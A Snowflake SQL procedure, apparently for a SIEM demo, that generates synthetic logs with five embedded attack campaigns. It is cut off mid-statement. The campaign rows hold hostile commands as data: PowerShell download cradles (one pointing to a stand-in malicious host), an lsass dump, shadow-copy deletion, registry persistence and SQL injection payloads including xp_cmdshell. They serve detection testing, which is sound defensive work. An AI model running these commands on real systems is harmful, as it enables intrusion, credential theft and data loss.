-- ============================================================================
-- Snowflake XDR/SIEM - Synthetic Log Generators
-- ============================================================================
-- Stored procedures that generate realistic security logs with embedded
-- attack campaigns. Generates 7 days of historical data with:
--   - Normal baseline traffic (~95% of events)
--   - 5 embedded attack campaigns (~5% of events) spread across the week
--
-- Attack Campaigns:
--   1. Brute Force -> Credential Access -> Lateral Movement
--   2. Phishing -> PowerShell -> Credential Dump -> Ransomware
--   3. Cloud Privilege Escalation -> Data Exfiltration
--   4. Insider Threat -> Bulk Data Access -> External Upload
--   5. Web App Exploitation -> Web Shell -> C2 Beaconing
-- ============================================================================

USE DATABASE SNOWFLAKE_XDR;
USE SCHEMA RAW_LOGS;

-- ---------------------------------------------------------------------------
-- Helper: Generate random IPs, hostnames, users for realistic data
-- ---------------------------------------------------------------------------
CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.RAW_LOGS.GENERATE_SYNTHETIC_LOGS(
    DAYS_BACK NUMBER DEFAULT 7,
    EVENTS_PER_DAY NUMBER DEFAULT 5000
)
RETURNS VARCHAR
LANGUAGE SQL
AS
$$
DECLARE
    start_time TIMESTAMP_LTZ;
    total_events NUMBER DEFAULT 0;
    auth_limit NUMBER;
    eproc_limit NUMBER;
    net_limit NUMBER;
    dns_limit NUMBER;
BEGIN
    start_time := DATEADD('day', -:DAYS_BACK, CURRENT_TIMESTAMP());
    auth_limit := FLOOR(:EVENTS_PER_DAY * :DAYS_BACK * 0.3);
    eproc_limit := FLOOR(:EVENTS_PER_DAY * :DAYS_BACK * 0.25);
    net_limit := FLOOR(:EVENTS_PER_DAY * :DAYS_BACK * 0.3);
    dns_limit := FLOOR(:EVENTS_PER_DAY * :DAYS_BACK * 0.15 / 20);

    -- =========================================================================
    -- NORMAL AUTHENTICATION TRAFFIC
    -- =========================================================================
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION (
        _time, action, app, authentication_method, authentication_service,
        dest, src, user_name, user_id, user_type, signature, signature_id,
        vendor_product, host, source, sourcetype, geo_country
    )
    SELECT
        DATEADD('second', UNIFORM(0, :DAYS_BACK * 86400, RANDOM()), :start_time) AS _time,
        CASE WHEN UNIFORM(1,100,RANDOM()) <= 95 THEN 'success' ELSE 'failure' END AS action,
        arr_apps.value::VARCHAR AS app,
        CASE UNIFORM(1,4,RANDOM())
            WHEN 1 THEN 'password'
            WHEN 2 THEN 'mfa'
            WHEN 3 THEN 'saml'
            WHEN 4 THEN 'certificate'
        END AS authentication_method,
        CASE UNIFORM(1,3,RANDOM())
            WHEN 1 THEN 'ActiveDirectory'
            WHEN 2 THEN 'Okta'
            WHEN 3 THEN 'AzureAD'
        END AS authentication_service,
        arr_hosts.value::VARCHAR AS dest,
        '10.' || UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR AS src,
        arr_users.value::VARCHAR AS user_name,
        'UID-' || UNIFORM(1000,9999,RANDOM())::VARCHAR AS user_id,
        CASE UNIFORM(1,3,RANDOM()) WHEN 1 THEN 'IAMUser' WHEN 2 THEN 'Admin' ELSE 'Service' END AS user_type,
        CASE WHEN UNIFORM(1,100,RANDOM()) <= 95 THEN 'An account was successfully logged on' ELSE 'An account failed to log on' END AS signature,
        CASE WHEN UNIFORM(1,100,RANDOM()) <= 95 THEN '4624' ELSE '4625' END AS signature_id,
        'Microsoft Windows Security' AS vendor_product,
        arr_hosts.value::VARCHAR AS host,
        'WinEventLog:Security' AS source,
        'WinEventLog:Security' AS sourcetype,
        CASE UNIFORM(1,5,RANDOM()) WHEN 1 THEN 'US' WHEN 2 THEN 'GB' WHEN 3 THEN 'DE' WHEN 4 THEN 'CA' ELSE 'US' END AS geo_country
    FROM
        TABLE(FLATTEN(ARRAY_CONSTRUCT(
            'win:local','ssh','vpn','okta','rdp','smb','web_portal'
        ))) arr_apps,
        TABLE(FLATTEN(ARRAY_CONSTRUCT(
            'DC01','DC02','WEB-PROD-01','WEB-PROD-02','DB-PROD-01',
            'FILE-SVR-01','MAIL-01','VPN-GW-01','JUMP-01','APP-SVR-01'
        ))) arr_hosts,
        TABLE(FLATTEN(ARRAY_CONSTRUCT(
            'jsmith','mwilliams','rjohnson','kbrown','ldavis',
            'pgarcia','tlee','nmartin','svc_backup','svc_monitor',
            'admin_ops','admin_sec','dwilson','janderson','cthomas'
        ))) arr_users
    WHERE UNIFORM(1, 150, RANDOM()) = 1  -- sample to control volume
    LIMIT :AUTH_LIMIT;

    -- =========================================================================
    -- NORMAL ENDPOINT PROCESS ACTIVITY
    -- =========================================================================
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES (
        _time, action, dest, user_name, process, process_name, process_id,
        process_path, parent_process, parent_process_name, parent_process_id,
        parent_process_path, os, vendor_product, host, source, sourcetype
    )
    SELECT
        DATEADD('second', UNIFORM(0, :DAYS_BACK * 86400, RANDOM()), :start_time),
        'allowed',
        h.value::VARCHAR,
        u.value::VARCHAR,
        p.value:cmd::VARCHAR,
        p.value:name::VARCHAR,
        UNIFORM(1000, 65535, RANDOM()),
        p.value:path::VARCHAR,
        pp.value:cmd::VARCHAR,
        pp.value:name::VARCHAR,
        UNIFORM(100, 999, RANDOM()),
        pp.value:path::VARCHAR,
        'Windows 10 Enterprise',
        'Microsoft Sysmon',
        h.value::VARCHAR,
        'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
        'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational'
    FROM
        TABLE(FLATTEN(ARRAY_CONSTRUCT(
            'WKS-001','WKS-002','WKS-003','WKS-004','WKS-005',
            'WKS-006','WKS-007','WKS-008','WKS-009','WKS-010',
            'SRV-WEB-01','SRV-DB-01','SRV-APP-01','DC01','DC02'
        ))) h,
        TABLE(FLATTEN(ARRAY_CONSTRUCT(
            'jsmith','mwilliams','rjohnson','kbrown','ldavis',
            'pgarcia','tlee','nmartin'
        ))) u,
        TABLE(FLATTEN(ARRAY_CONSTRUCT(
            OBJECT_CONSTRUCT('name','chrome.exe','path','C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe','cmd','chrome.exe --type=renderer'),
            OBJECT_CONSTRUCT('name','outlook.exe','path','C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE','cmd','OUTLOOK.EXE'),
            OBJECT_CONSTRUCT('name','teams.exe','path','C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe','cmd','Teams.exe --startup'),
            OBJECT_CONSTRUCT('name','notepad.exe','path','C:\\Windows\\System32\\notepad.exe','cmd','notepad.exe document.txt'),
            OBJECT_CONSTRUCT('name','explorer.exe','path','C:\\Windows\\explorer.exe','cmd','C:\\Windows\\explorer.exe'),
            OBJECT_CONSTRUCT('name','svchost.exe','path','C:\\Windows\\System32\\svchost.exe','cmd','svchost.exe -k netsvcs')
        ))) p,
        TABLE(FLATTEN(ARRAY_CONSTRUCT(
            OBJECT_CONSTRUCT('name','explorer.exe','path','C:\\Windows\\explorer.exe','cmd','C:\\Windows\\explorer.exe'),
            OBJECT_CONSTRUCT('name','services.exe','path','C:\\Windows\\System32\\services.exe','cmd','C:\\Windows\\System32\\services.exe'),
            OBJECT_CONSTRUCT('name','svchost.exe','path','C:\\Windows\\System32\\svchost.exe','cmd','svchost.exe -k netsvcs')
        ))) pp
    WHERE UNIFORM(1, 300, RANDOM()) = 1
    LIMIT :EPROC_LIMIT;

    -- =========================================================================
    -- NORMAL NETWORK TRAFFIC
    -- =========================================================================
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.NETWORK_TRAFFIC (
        _time, action, src, src_ip, src_port, dest, dest_ip, dest_port,
        transport, protocol, bytes_in, bytes_out, duration, direction,
        vendor_product, host, source, sourcetype, dvc
    )
    SELECT
        DATEADD('second', UNIFORM(0, :DAYS_BACK * 86400, RANDOM()), :start_time),
        CASE WHEN UNIFORM(1,100,RANDOM()) <= 98 THEN 'allowed' ELSE 'blocked' END,
        '10.' || UNIFORM(1,10,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR,
        '10.' || UNIFORM(1,10,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR,
        UNIFORM(1024, 65535, RANDOM()),
        CASE UNIFORM(1,5,RANDOM())
            WHEN 1 THEN 'WEB-PROD-01' WHEN 2 THEN 'DB-PROD-01' WHEN 3 THEN 'FILE-SVR-01'
            WHEN 4 THEN 'MAIL-01' ELSE '8.8.8.8'
        END,
        CASE UNIFORM(1,5,RANDOM())
            WHEN 1 THEN '10.1.1.10' WHEN 2 THEN '10.2.1.20' WHEN 3 THEN '10.3.1.30'
            WHEN 4 THEN '10.4.1.40' ELSE '8.8.8.8'
        END,
        CASE UNIFORM(1,6,RANDOM())
            WHEN 1 THEN 443 WHEN 2 THEN 80 WHEN 3 THEN 53 WHEN 4 THEN 445
            WHEN 5 THEN 3389 ELSE 22
        END,
        CASE WHEN UNIFORM(1,10,RANDOM()) <= 9 THEN 'tcp' ELSE 'udp' END,
        CASE UNIFORM(1,6,RANDOM())
            WHEN 1 THEN 'HTTPS' WHEN 2 THEN 'HTTP' WHEN 3 THEN 'DNS' WHEN 4 THEN 'SMB'
            WHEN 5 THEN 'RDP' ELSE 'SSH'
        END,
        UNIFORM(100, 500000, RANDOM()),
        UNIFORM(100, 2000000, RANDOM()),
        UNIFORM(1, 300, RANDOM())::FLOAT / 10,
        CASE WHEN UNIFORM(1,2,RANDOM()) = 1 THEN 'outbound' ELSE 'inbound' END,
        'Palo Alto Networks Firewall',
        'FW-EDGE-01',
        'pan:traffic',
        'pan:traffic',
        'FW-EDGE-01'
    FROM TABLE(GENERATOR(ROWCOUNT => :NET_LIMIT)) g;

    -- =========================================================================
    -- NORMAL DNS ACTIVITY
    -- =========================================================================
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.DNS_ACTIVITY (
        _time, action, src, dest, query, query_type, answer, reply_code,
        transport, query_length, vendor_product, host, source, sourcetype
    )
    SELECT
        DATEADD('second', UNIFORM(0, :DAYS_BACK * 86400, RANDOM()), :start_time),
        'query',
        '10.' || UNIFORM(1,10,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR,
        CASE WHEN UNIFORM(1,2,RANDOM())=1 THEN '10.1.1.53' ELSE '10.1.2.53' END,
        d.value::VARCHAR,
        CASE UNIFORM(1,4,RANDOM()) WHEN 1 THEN 'A' WHEN 2 THEN 'AAAA' WHEN 3 THEN 'CNAME' ELSE 'MX' END,
        UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR || '.' || UNIFORM(1,254,RANDOM())::VARCHAR,
        CASE WHEN UNIFORM(1,100,RANDOM()) <= 95 THEN 'NOERROR' ELSE 'NXDOMAIN' END,
        'udp',
        LENGTH(d.value::VARCHAR),
        'Infoblox DNS',
        'DNS-01',
        'infoblox:dns',
        'infoblox:dns'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT(
        'google.com','office.com','microsoft.com','github.com','slack.com',
        'zoom.us','amazonaws.com','cloudflare.com','akamai.net','outlook.com',
        'login.microsoftonline.com','teams.microsoft.com','onedrive.live.com',
        'update.microsoft.com','dl.google.com','fonts.googleapis.com',
        'cdn.jsdelivr.net','api.github.com','registry.npmjs.org','pypi.org'
    ))) d,
    TABLE(GENERATOR(ROWCOUNT => :DNS_LIMIT)) g;

    -- =========================================================================
    -- ATTACK CAMPAIGN 1: Brute Force -> Lateral Movement
    -- Timeline: Day 2-3
    -- =========================================================================
    -- Phase 1: Brute force attempts against multiple users from external IP
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION (
        _time, action, app, authentication_method, dest, src, user_name,
        signature, signature_id, vendor_product, host, source, sourcetype,
        geo_country, reason
    )
    SELECT
        DATEADD('second', UNIFORM(0, 7200, RANDOM()), DATEADD('day', -5, CURRENT_TIMESTAMP())) AS _time,
        'failure',
        'vpn',
        'password',
        'VPN-GW-01',
        '185.220.101.42',  -- known bad IP from threat intel
        u.value::VARCHAR,
        'An account failed to log on',
        '4625',
        'Microsoft Windows Security',
        'VPN-GW-01',
        'WinEventLog:Security',
        'WinEventLog:Security',
        'RU',
        'Invalid credentials'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT(
        'jsmith','mwilliams','rjohnson','kbrown','ldavis',
        'admin_ops','admin_sec','administrator','root','svc_backup'
    ))) u,
    TABLE(GENERATOR(ROWCOUNT => 5)) g;  -- 5 attempts per user = 50 failures

    -- Phase 2: Successful login (compromised credential)
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION (
        _time, action, app, authentication_method, dest, src, user_name,
        signature, signature_id, vendor_product, host, source, sourcetype,
        geo_country
    )
    VALUES (
        DATEADD('hour', 3, DATEADD('day', -5, CURRENT_TIMESTAMP())),
        'success', 'vpn', 'password', 'VPN-GW-01', '185.220.101.42', 'jsmith',
        'An account was successfully logged on', '4624',
        'Microsoft Windows Security', 'VPN-GW-01', 'WinEventLog:Security',
        'WinEventLog:Security', 'RU'
    );

    -- Phase 3: Discovery commands from compromised user
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES (
        _time, action, dest, user_name, process, process_name, process_id,
        process_path, parent_process_name, parent_process_path,
        os, vendor_product, host, source, sourcetype
    )
    SELECT
        DATEADD('minute', m.index * 3, DATEADD('hour', 4, DATEADD('day', -5, CURRENT_TIMESTAMP()))),
        'allowed',
        'WKS-001',
        'jsmith',
        cmd.value:cmd::VARCHAR,
        cmd.value:name::VARCHAR,
        UNIFORM(5000, 6000, RANDOM()),
        cmd.value:path::VARCHAR,
        'cmd.exe',
        'C:\\Windows\\System32\\cmd.exe',
        'Windows 10 Enterprise',
        'Microsoft Sysmon',
        'WKS-001',
        'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
        'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT(
        OBJECT_CONSTRUCT('name','net.exe','path','C:\\Windows\\System32\\net.exe','cmd','net user /domain'),
        OBJECT_CONSTRUCT('name','net.exe','path','C:\\Windows\\System32\\net.exe','cmd','net group "Domain Admins" /domain'),
        OBJECT_CONSTRUCT('name','nltest.exe','path','C:\\Windows\\System32\\nltest.exe','cmd','nltest /dclist:corp.local'),
        OBJECT_CONSTRUCT('name','ping.exe','path','C:\\Windows\\System32\\ping.exe','cmd','ping DC01'),
        OBJECT_CONSTRUCT('name','nslookup.exe','path','C:\\Windows\\System32\\nslookup.exe','cmd','nslookup DC01.corp.local'),
        OBJECT_CONSTRUCT('name','whoami.exe','path','C:\\Windows\\System32\\whoami.exe','cmd','whoami /priv')
    ))) cmd,
    TABLE(FLATTEN(ARRAY_CONSTRUCT(0,1,2,3,4,5))) m;

    -- Phase 4: Lateral movement via SMB
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.NETWORK_TRAFFIC (
        _time, action, src, src_ip, src_port, dest, dest_ip, dest_port,
        transport, protocol, bytes_out, duration, direction,
        vendor_product, host, source, sourcetype, dvc
    )
    SELECT
        DATEADD('minute', UNIFORM(0, 120, RANDOM()), DATEADD('hour', 6, DATEADD('day', -5, CURRENT_TIMESTAMP()))),
        'allowed',
        'WKS-001', '10.1.5.101', UNIFORM(49152, 65535, RANDOM()),
        t.value::VARCHAR,
        CASE t.value::VARCHAR
            WHEN 'DC01' THEN '10.1.1.10'
            WHEN 'DC02' THEN '10.1.1.11'
            WHEN 'FILE-SVR-01' THEN '10.1.2.30'
            ELSE '10.1.3.40'
        END,
        445,
        'tcp', 'SMB',
        UNIFORM(10000, 500000, RANDOM()),
        UNIFORM(1, 30, RANDOM())::FLOAT,
        'outbound',
        'Palo Alto Networks Firewall', 'FW-EDGE-01', 'pan:traffic', 'pan:traffic', 'FW-EDGE-01'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT('DC01','DC02','FILE-SVR-01','SRV-APP-01'))) t,
    TABLE(GENERATOR(ROWCOUNT => 3)) g;

    -- Phase 4b: RDP lateral movement
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION (
        _time, action, app, authentication_method, dest, src, user_name,
        signature, signature_id, vendor_product, host, source, sourcetype, geo_country
    )
    SELECT
        DATEADD('minute', UNIFORM(0, 60, RANDOM()), DATEADD('hour', 7, DATEADD('day', -5, CURRENT_TIMESTAMP()))),
        'success', 'rdp', 'password', t.value::VARCHAR, '10.1.5.101', 'jsmith',
        'An account was successfully logged on', '4624',
        'Microsoft Windows Security', t.value::VARCHAR, 'WinEventLog:Security',
        'WinEventLog:Security', 'US'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT('DC01','FILE-SVR-01','SRV-APP-01'))) t;

    -- =========================================================================
    -- ATTACK CAMPAIGN 2: Phishing -> PowerShell -> Credential Dump -> Ransomware
    -- Timeline: Day 4
    -- =========================================================================
    -- Phase 1: Suspicious attachment execution
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES (
        _time, action, dest, user_name, process, process_name, process_id,
        process_path, parent_process_name, parent_process_path,
        os, vendor_product, host, source, sourcetype
    )
    VALUES
    (DATEADD('hour', 9, DATEADD('day', -3, CURRENT_TIMESTAMP())),
     'allowed', 'WKS-003', 'rjohnson',
     'cmd.exe /c powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQBsAGkAbAAuAGMAbwBtACcAKQA=',
     'cmd.exe', 5523, 'C:\\Windows\\System32\\cmd.exe',
     'WINWORD.EXE', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
     'Windows 10 Enterprise', 'Microsoft Sysmon', 'WKS-003',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational');

    -- Phase 2: PowerShell download cradle
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES (
        _time, action, dest, user_name, process, process_name, process_id,
        process_path, parent_process_name, parent_process_path,
        process_integrity_level, os, vendor_product, host, source, sourcetype
    )
    VALUES
    (DATEADD('minute', 1, DATEADD('hour', 9, DATEADD('day', -3, CURRENT_TIMESTAMP()))),
     'allowed', 'WKS-003', 'rjohnson',
     'powershell.exe -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://evil-update.com/stage2.ps1'')"',
     'powershell.exe', 5524, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
     'cmd.exe', 'C:\\Windows\\System32\\cmd.exe',
     'high', 'Windows 10 Enterprise', 'Microsoft Sysmon', 'WKS-003',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational');

    -- Phase 3: Credential dump (mimikatz-like)
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES (
        _time, action, dest, user_name, process, process_name, process_id,
        process_path, parent_process_name, parent_process_path,
        process_integrity_level, os, vendor_product, host, source, sourcetype
    )
    VALUES
    (DATEADD('minute', 5, DATEADD('hour', 9, DATEADD('day', -3, CURRENT_TIMESTAMP()))),
     'allowed', 'WKS-003', 'SYSTEM',
     'rundll32.exe C:\\Windows\\Temp\\dump.dll,MiniDump 656 C:\\Windows\\Temp\\lsass.dmp full',
     'rundll32.exe', 5530, 'C:\\Windows\\System32\\rundll32.exe',
     'powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
     'system', 'Windows 10 Enterprise', 'Microsoft Sysmon', 'WKS-003',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational');

    -- Phase 4: Volume shadow copy deletion (ransomware prep)
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES (
        _time, action, dest, user_name, process, process_name, process_id,
        process_path, parent_process_name, parent_process_path,
        os, vendor_product, host, source, sourcetype
    )
    VALUES
    (DATEADD('hour', 2, DATEADD('hour', 9, DATEADD('day', -3, CURRENT_TIMESTAMP()))),
     'allowed', 'WKS-003', 'SYSTEM',
     'vssadmin.exe Delete Shadows /All /Quiet',
     'vssadmin.exe', 5545, 'C:\\Windows\\System32\\vssadmin.exe',
     'cmd.exe', 'C:\\Windows\\System32\\cmd.exe',
     'Windows 10 Enterprise', 'Microsoft Sysmon', 'WKS-003',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational');

    -- Phase 4b: Registry persistence
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_REGISTRY (
        _time, action, dest, user_name, registry_hive, registry_path,
        registry_key_name, registry_value_name, registry_value_data,
        registry_value_type, status, process_name,
        vendor_product, host, source, sourcetype
    )
    VALUES
    (DATEADD('minute', 10, DATEADD('hour', 9, DATEADD('day', -3, CURRENT_TIMESTAMP()))),
     'modified', 'WKS-003', 'rjohnson',
     'HKEY_LOCAL_MACHINE\\Software', 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
     'Run', 'WindowsUpdate', 'C:\\Windows\\Temp\\svchost_update.exe',
     'REG_SZ', 'success', 'reg.exe',
     'Microsoft Sysmon', 'WKS-003',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
     'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational');

    -- =========================================================================
    -- ATTACK CAMPAIGN 3: Cloud Privilege Escalation
    -- Timeline: Day 5
    -- =========================================================================
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.CLOUD_API (
        _time, action, user_name, user_type, src, dest, object, object_category,
        result, app, vendor_account, vendor_region, vendor_product,
        host, source, sourcetype
    )
    SELECT
        DATEADD('minute', m.index * 15, DATEADD('hour', 14, DATEADD('day', -2, CURRENT_TIMESTAMP()))),
        api.value:action::VARCHAR,
        'compromised-dev-user',
        'IAMUser',
        '203.0.113.50',
        api.value:dest::VARCHAR,
        api.value:object::VARCHAR,
        api.value:category::VARCHAR,
        api.value:result::VARCHAR,
        api.value:service::VARCHAR,
        '123456789012',
        'us-east-1',
        'aws',
        'cloudtrail.amazonaws.com',
        'aws:cloudtrail',
        'aws:cloudtrail'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT(
        OBJECT_CONSTRUCT('action','CreateRole','dest','iam.amazonaws.com','object','arn:aws:iam::123456789012:role/backdoor-admin','category','role','result','success','service','iam'),
        OBJECT_CONSTRUCT('action','AttachRolePolicy','dest','iam.amazonaws.com','object','arn:aws:iam::aws:policy/AdministratorAccess','category','policy','result','success','service','iam'),
        OBJECT_CONSTRUCT('action','AssumeRole','dest','sts.amazonaws.com','object','arn:aws:iam::123456789012:role/backdoor-admin','category','role','result','success','service','sts'),
        OBJECT_CONSTRUCT('action','ListBuckets','dest','s3.amazonaws.com','object','*','category','bucket','result','success','service','s3'),
        OBJECT_CONSTRUCT('action','GetBucketPolicy','dest','s3.amazonaws.com','object','arn:aws:s3:::company-sensitive-data','category','bucket','result','success','service','s3'),
        OBJECT_CONSTRUCT('action','PutBucketPolicy','dest','s3.amazonaws.com','object','arn:aws:s3:::company-sensitive-data','category','bucket','result','success','service','s3'),
        OBJECT_CONSTRUCT('action','GetObject','dest','s3.amazonaws.com','object','arn:aws:s3:::company-sensitive-data/exports/customer_pii.csv','category','object','result','success','service','s3'),
        OBJECT_CONSTRUCT('action','StopLogging','dest','cloudtrail.amazonaws.com','object','arn:aws:cloudtrail:us-east-1:123456789012:trail/main-trail','category','trail','result','success','service','cloudtrail')
    ))) api,
    TABLE(FLATTEN(ARRAY_CONSTRUCT(0,1,2,3,4,5,6,7))) m
    WHERE api.index = m.index;

    -- =========================================================================
    -- ATTACK CAMPAIGN 4: Insider Threat / Data Exfiltration
    -- Timeline: Day 6 (after hours)
    -- =========================================================================
    -- Bulk file access after hours
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_FILESYSTEM (
        _time, action, dest, user_name, file_name, file_path, file_size,
        process_name, vendor_product, host, source, sourcetype
    )
    SELECT
        DATEADD('minute', UNIFORM(0, 180, RANDOM()), DATEADD('hour', 22, DATEADD('day', -1, CURRENT_TIMESTAMP()))),
        'read',
        'FILE-SVR-01',
        'dwilson',
        'customer_data_' || UNIFORM(1,50,RANDOM())::VARCHAR || '.xlsx',
        '\\\\FILE-SVR-01\\Confidential\\Customer_Records\\customer_data_' || UNIFORM(1,50,RANDOM())::VARCHAR || '.xlsx',
        UNIFORM(5000, 50000, RANDOM()),
        'explorer.exe',
        'Microsoft Sysmon',
        'FILE-SVR-01',
        'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
        'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational'
    FROM TABLE(GENERATOR(ROWCOUNT => 45)) g;

    -- Large outbound transfer (exfiltration)
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.NETWORK_TRAFFIC (
        _time, action, src, src_ip, src_port, dest, dest_ip, dest_port,
        transport, protocol, bytes_out, duration, direction,
        vendor_product, host, source, sourcetype, dvc
    )
    SELECT
        DATEADD('minute', UNIFORM(180, 240, RANDOM()), DATEADD('hour', 22, DATEADD('day', -1, CURRENT_TIMESTAMP()))),
        'allowed',
        'WKS-007', '10.1.5.107', UNIFORM(49152, 65535, RANDOM()),
        'data-sync-service.net', '91.219.236.222', 443,
        'tcp', 'HTTPS',
        UNIFORM(50000000, 200000000, RANDOM()),  -- 50-200 MB per connection
        UNIFORM(300, 1800, RANDOM())::FLOAT,
        'outbound',
        'Palo Alto Networks Firewall', 'FW-EDGE-01', 'pan:traffic', 'pan:traffic', 'FW-EDGE-01'
    FROM TABLE(GENERATOR(ROWCOUNT => 5)) g;

    -- =========================================================================
    -- ATTACK CAMPAIGN 5: Web App Exploitation -> Web Shell -> C2
    -- Timeline: Day 3-4
    -- =========================================================================
    -- SQL injection attempts
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.WEB_ACTIVITY (
        _time, action, src, dest, url, uri_path, uri_query, http_method,
        status, http_user_agent, bytes_in, bytes_out,
        vendor_product, host, source, sourcetype, threat_category
    )
    SELECT
        DATEADD('minute', UNIFORM(0, 120, RANDOM()), DATEADD('hour', 3, DATEADD('day', -4, CURRENT_TIMESTAMP()))),
        CASE WHEN UNIFORM(1,10,RANDOM()) <= 8 THEN 'blocked' ELSE 'allowed' END,
        '23.106.215.100',
        'WEB-PROD-01',
        'https://app.company.com/api/users?id=' || sqli.value::VARCHAR,
        '/api/users',
        'id=' || sqli.value::VARCHAR,
        'GET',
        CASE WHEN UNIFORM(1,10,RANDOM()) <= 8 THEN 403 ELSE 200 END,
        'sqlmap/1.7.2#stable (https://sqlmap.org)',
        UNIFORM(100, 500, RANDOM()),
        UNIFORM(200, 50000, RANDOM()),
        'F5 BIG-IP ASM',
        'WEB-PROD-01',
        'f5:bigip:asm',
        'f5:bigip:asm',
        'sqli'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT(
        '1 OR 1=1--',
        '1'' UNION SELECT username,password FROM users--',
        '1; DROP TABLE users--',
        '1'' AND SLEEP(5)--',
        '-1 UNION ALL SELECT NULL,NULL,CONCAT(username,char(58),password) FROM admin--',
        '1'' OR ''x''=''x',
        '1 UNION SELECT @@version--',
        '1''; EXEC xp_cmdshell(''whoami'')--'
    ))) sqli,
    TABLE(GENERATOR(ROWCOUNT => 3)) g;

    -- Successful web shell upload (one got through)
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.WEB_ACTIVITY (
        _time, action, src, dest, url, uri_path, http_method,
        status, http_user_agent, bytes_in, bytes_out,
        vendor_product, host, source, sourcetype, threat_category
    )
    VALUES
    (DATEADD('hour', 5, DATEADD('day', -4, CURRENT_TIMESTAMP())),
     'allowed', '23.106.215.100', 'WEB-PROD-01',
     'https://app.company.com/uploads/../shell.aspx', '/uploads/../shell.aspx',
     'POST', 200, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
     45000, 200,
     'F5 BIG-IP ASM', 'WEB-PROD-01', 'f5:bigip:asm', 'f5:bigip:asm', 'webshell');

    -- C2 Beaconing from compromised web server (periodic callbacks)
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.NETWORK_TRAFFIC (
        _time, action, src, src_ip, src_port, dest, dest_ip, dest_port,
        transport, protocol, bytes_in, bytes_out, duration, direction,
        vendor_product, host, source, sourcetype, dvc
    )
    SELECT
        DATEADD('second', m.index * 300 + UNIFORM(-15, 15, RANDOM()), -- ~5 min intervals with jitter
            DATEADD('hour', 6, DATEADD('day', -4, CURRENT_TIMESTAMP()))),
        'allowed',
        'WEB-PROD-01', '10.1.1.10', UNIFORM(49152, 65535, RANDOM()),
        'cdn-analytics-update.com', '185.220.101.42', 443,
        'tcp', 'HTTPS',
        UNIFORM(50, 200, RANDOM()),     -- small C2 response
        UNIFORM(100, 500, RANDOM()),    -- small beacon
        UNIFORM(1, 3, RANDOM())::FLOAT,
        'outbound',
